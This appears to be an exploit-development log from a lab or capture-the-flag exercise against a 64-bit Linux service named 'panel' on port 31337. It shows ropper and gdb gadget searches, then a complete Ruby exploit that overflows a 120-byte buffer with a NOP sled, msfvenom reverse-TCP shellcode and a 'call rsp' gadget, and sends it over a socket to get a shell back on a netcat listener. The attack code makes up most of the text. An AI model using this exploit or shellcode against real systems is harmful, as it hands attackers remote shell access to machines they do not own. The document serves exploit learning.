[INFO] File: panel
0x0000000000000df3: jmp qword ptr [rbp]; 
0x0000000000000b83: jmp qword ptr [rsi + 0x2e]; 
0x0000000000000a30: jmp qword ptr [rsi - 0x39]; 
0x0000000000000a40: jmp qword ptr [rsi - 0x77]; 
0x0000000000000895: jmp rax; 

root@kali:~/Desktop# ropper -f panel --search call
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: call

[INFO] File: panel
0x00000000000009a3: call 0x790; nop; leave; ret; 
0x00000000000009a4: call 0xffffffff910009a6; leave; ret; 
0x0000000000000d6b: call qword ptr [rax]; 
0x0000000000000935: call qword ptr [rbp + 0x48]; 
0x0000000000000728: call rax; 
0x0000000000000728: call rax; add rsp, 8; ret; 
0x0000000000000cfb: call rsp;******this will do

#exploit dev

#the exploit
#!/usr/bin/ruby
# encoding: ascii                       #set default script encoding
                                        #when dealing with shelle code ascii is the best
                                        #or use force_encoding when pack ret, and bytesize for shell length instead of length or size
require"socket"

#"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\$
#bad char = "\x00"

#msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.1.1.129 LPORT=443 -b "\x00" -f rb
#Payload size: 119 bytes

revShell =
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef" +
"\xff\xff\xff\x48\xbb\x34\xfb\x30\x2b\x7a\xdd\x9e\x66\x48" +
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5e\xd2\x68" +
"\xb2\x10\xdf\xc1\x0c\x35\xa5\x3f\x2e\x32\x4a\xd6\xdf\x36" +
"\xfb\x31\x90\x70\xdc\x9f\xe7\x65\xb3\xb9\xcd\x10\xcd\xc4" +
"\x0c\x1e\xa3\x3f\x2e\x10\xde\xc0\x2e\xcb\x35\x5a\x0a\x22" +
"\xd2\x9b\x13\xc2\x91\x0b\x73\xe3\x95\x25\x49\x56\x92\x5e" +
"\x04\x09\xb5\x9e\x35\x7c\x72\xd7\x79\x2d\x95\x17\x80\x3b" +
"\xfe\x30\x2b\x7a\xdd\x9e\x66"

puts"ascii only: %s"%revShell.ascii_only?       #proof that ruby dont see this as ascii only and length/size will vary

puts "revShell len: %i"%[revShell.length]
callRsp = [0x400cfb].pack("Q")

#puts "revShell len: %i"%[revShell.bytesize]
#callRsp = [0x400cfb].pack("Q").force_encoding("utf-8")
#120 bytes to rip
#payload = "\x90"*(120 -revShell.bytesize) + revShell + callRsp

payload = "\x90"*(120 -revShell.length) + revShell + callRsp

puts"dont forget nc -lnv 443"

puts payload.unpack("H*")
#puts "total length: %i"%payload.bytesize
puts "total length: %i"%payload.length

TCPSocket.open("10.1.1.128", 31337) do |s|
#TCPSocket.open("127.0.0.1", 31337) do |s| 
  sleep 2
  print s.recv(0x1000)
  s.print payload
  print s.recv(0x1000)
  #s.puts "\xcc"*8 + "A"*(112 - 8) + "B"*8 + "C"*8
end

root@kali:~/Desktop# netstat -ant4p
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      688/sshd            
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      441/postgres        
tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      26913/./panel       
root@kali:~/Desktop# edb --attach 26913

root@kali:~/Desktop# gdb ./panel 
…
gdb-peda$ set follow-fork-mode child

gdb-peda$ jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp —> score
0x400d6b : call [rax]
